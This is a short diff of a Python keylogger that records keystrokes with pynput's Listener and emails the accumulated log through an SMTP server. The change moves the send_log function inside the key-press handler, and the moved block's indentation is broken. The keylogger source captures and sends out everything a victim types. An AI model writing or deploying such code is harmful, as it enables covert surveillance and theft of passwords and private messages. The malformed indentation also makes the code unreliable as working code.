@@ -37,6 +37,13 @@ def on_press(key):
     global full_log
     global email
     global email_char_limit
+      
+     def send_log():
+    server.sendmail(
+        email,
+        email,
+        full_log
+    )
 
     # condition if user presses the enter key or spce bar
     if key == Key.space or key == Key.enter:
@@ -58,12 +65,7 @@ def on_press(key):
     if key == Key.esc:
         return False
       
-def send_log():
-    server.sendmail(
-        email,
-        email,
-        full_log
-    )
+
 
 with Listener(on_press=on_press) as listener:
     listener.join()
